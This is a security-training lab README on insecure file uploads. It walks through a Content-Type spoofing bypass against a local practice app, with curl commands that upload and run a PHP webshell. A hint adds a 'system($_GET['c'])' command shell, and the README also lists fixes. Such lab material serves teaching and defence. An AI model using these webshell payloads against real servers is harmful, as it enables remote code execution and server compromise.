# insecure-file-upload

## Concepts

A file upload is **insecure** when the server stores or serves an uploaded file without properly
verifying what it really is. If an attacker can land an **executable script** (PHP, JSP, …) in a
directory the web server runs, browsing to that file executes attacker code — a **webshell**, and
from there full **remote code execution (RCE)**.

- **Why it matters.** One weak upload form becomes code execution as the web process: read data, plant
  backdoors, pivot into the network. It sits under *Insecure Design* / *Security Misconfiguration* in
  the OWASP Top 10 and is a classic path to total server compromise.
- **The weak checks apps get wrong.** Trusting the **`Content-Type` header the client sends**, or only
  looking at the **file extension**. The `Content-Type` is fully attacker-controlled — you can send
  `Content-Type: image/png` while the file is actually `shell.php`. If the app saves by the original
  filename into a served directory, requesting `/uploads/shell.php` runs it.
- **Bypass variations.** Double extensions (`shell.php.jpg`), null bytes, case tricks (`.pHp`), or a
  content-type that lies about a script.
- **The fix.** Validate the file's **real content** (magic bytes), generate a **random server-side
  filename**, store uploads **outside the web root**, and **never serve them as executable**.

This lab's `/upload.php` checks **only the `Content-Type` header** and saves files by their original
name into `uploads/`, which Apache executes.

## Tasks

Start the lab with `./lab up insecure-file-upload`, then open a shell:
`./lab shell insecure-file-upload`. Snapvault runs at `http://localhost` — drive it with `curl`.

1. **Recon** — upload a normal image, then try a script, and watch the check:
   ```
   printf 'PNG fake' > a.png
   curl -s -F 'photo=@a.png;type=image/png' http://localhost/upload.php        # accepted
   printf '<?php echo 1; ?>' > shell.php
   curl -s -F 'photo=@shell.php;type=application/x-php' http://localhost/upload.php   # 415 rejected
   ```
   The app rejects the script **only** because of the `Content-Type` you sent.
2. **Exploit** — send a PHP webshell but **spoof the `Content-Type`** so the check passes, then browse
   the uploaded file to execute it:
   ```
   cat > shell.php <<'PHP'
   <?php file_put_contents('/flag/solved', "pwned by ".trim(shell_exec('id -un'))."\n"); echo 'ok'; ?>
   PHP
   curl -s -F 'photo=@shell.php;type=image/png;filename=shell.php' http://localhost/upload.php
   curl -s http://localhost/uploads/shell.php      # executes -> prints "ok"
   ```
   (If the response shows the raw `<?php …` instead of `ok`, it was served as source, not executed —
   re-check the extension.)
3. **Capture the flag** — your webshell wrote it on execution; confirm:
   ```
   cat /flag/solved
   ```
4. **Record your findings** in `/root/answers.txt` (`TRUSTED_HEADER`, `BYPASS`, `FIX`).

Check your work from the host: `./lab check insecure-file-upload`.

<details>
<summary>Hints</summary>

- With curl, `-F 'photo=@shell.php;type=image/png'` sets the multipart `Content-Type` to `image/png`
  regardless of the real file — that's the whole trick.
- Keep the filename ending in `.php` so Apache runs it; `shell.php.jpg` would be served as an image.
- The webshell can do anything the `www-data` user can: `file_put_contents('/flag/solved', ...)`, or
  `system($_GET['c'])` for an interactive shell.
- For the fix, any of: magic-byte validation, random server-side name, storing outside the web root,
  or never serving uploads as executable.

</details>

## My notes

<!-- Screenshots: ./lab shot insecure-file-upload ~/Screenshots/<file>.png <name>, then link it as
     ![what it shows](screenshots/<name>.png). Prefer code blocks for terminal output. -->

## Related

- `reflected-xss`, `sqli-auth-bypass` — other web attacks on the same app layer.
- `waf-modsecurity-crs` — the WAF that would try to block an upload like this.
